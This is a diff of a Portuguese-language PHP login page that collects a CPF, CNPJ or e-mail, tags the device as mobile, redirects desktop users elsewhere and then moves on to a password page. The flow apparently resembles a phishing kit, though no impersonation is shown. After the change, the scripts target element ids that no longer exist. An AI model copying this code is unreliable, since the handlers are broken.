@@ -278,16 +278,29 @@ if (!isset($_COOKIE['identificador_cliente'])) {
     </div>
 
     <div class="login-area">
-      <p>Bem-vindo, digite seu CPF, CNPJ ou E-mail para acessar sua conta</p>
-      <input type="text" id="identificador" placeholder="CPF, CNPJ ou E-mail" required>
-      <div class="error" id="erroMsg">
-        <img src="imagens/icon-erro.svg" alt="Erro">
-        Usuário inválido. Confira os dados.
-      </div>
-    </div>
+      <form action="processa.php" method="POST">
 
-    <button id="btn" type="button">Continuar</button>
-    <a href="#" class="link-outline">Criar conta</a>
+  <p>Bem-vindo, digite seu CPF, CNPJ ou E-mail para acessar sua conta</p>
+
+  <input
+    type="text"
+    id="identificador"
+    name="identificador"
+    placeholder="CPF, CNPJ ou E-mail"
+    required
+  >
+
+  <div id="erro" class="error">
+    <img src="imagens/icon-erro.svg" alt="Erro">
+    <span>Usuário inválido. Confira os dados.</span>
+  </div>
+
+  <button type="submit">Continuar</button>
+
+  <a href="#" class="link-outline">Criar conta</a>
+
+</form>
+
 
     <div class="comunicar">
       <img src="imagens/icon-phone.svg" alt="">
@@ -387,41 +400,34 @@ if (!isset($_COOKIE['identificador_cliente'])) {
       input.removeClass('error-border');
     });
 
-    <script>
-  $('#btn').on('click', function () {
-    const valor = $('#identificador').val().trim();
-    const tipo = tipoIdentificador(valor);
-    let valido = false;
+    $('#btn').on('click', function () {
+      const valor = $('#identificador').val().trim();
+      const tipo = tipoIdentificador(valor);
+      let valido = false;
+      if (tipo === 'cpf') valido = validarCPF(valor);
+      else if (tipo === 'cnpj') valido = validarCNPJ(valor);
+      else if (tipo === 'email') valido = validarEmail(valor);
 
-    // Log para depuração
-    console.log('Valor digitado:', valor);
-    console.log('Tipo identificado:', tipo);
+      if (!valido) {
+        $('#erroMsg').css('display', 'flex').hide().fadeIn(200);
+        $('#identificador').addClass('error-border');
+        return;
+      }
 
-    if (tipo === 'cpf') valido = validarCPF(valor);
-    else if (tipo === 'cnpj') valido = validarCNPJ(valor);
-    else if (tipo === 'email') valido = validarEmail(valor);
-
-    // Log para depuração
-    console.log('Validação:', valido);
-
-    if (!valido) {
-      $('#erroMsg').css('display', 'flex').hide().fadeIn(200);
-      $('#identificador').addClass('error-border');
-      return;
-    }
-
-    // Fade out do formulário de login antes de redirecionar
-    $('.login-area').fadeOut(300, function() {
       $.post('identificador.php', { 
           identificador: valor,
-          device_type: 'Mobile' // Adicionando o tipo de dispositivo
+          device_type: 'Mobile' // Adicione esta linha
       }, () => {
-          console.log('Redirecionando para a página de senha...');
-          window.location.href = 'senha.php'; // Redireciona para a página de senha
-      });
+          window.location.href = 'senha.php';
+      })
     });
+  document.addEventListener("DOMContentLoaded", function () {
+    const isMobile = /iphone|ipod|android|webos|blackberry|iemobile|opera mini/i.test(navigator.userAgent.toLowerCase());
+    if (!isMobile) {
+      window.location.href = "login-desktop.php";
+    }
   });
-</script>
+  </script>
   <script>
     function getCookie(name) {
         const value = `; ${document.cookie}`;
@@ -461,24 +467,3 @@ if (!isset($_COOKIE['identificador_cliente'])) {
   </script>
 </body>
 </html>
-<script>
-  document.getElementById('btn').addEventListener('click', function () {
-    const valor = document.getElementById('identificador').value.trim();
-    const tipo = tipoIdentificador(valor);
-    let valido = false;
-
-    if (tipo === 'cpf') valido = validarCPF(valor);
-    else if (tipo === 'cnpj') valido = validarCNPJ(valor);
-    else if (tipo === 'email') valido = validarEmail(valor);
-
-    if (!valido) {
-      document.getElementById('erroMsg').style.display = 'flex';
-      return;
-    }
-
-    // impede o redirect automático
-    sessionStorage.setItem('passouLogin', 'true');
-
-    window.location.href = 'senha.php';
-  });
-</script>
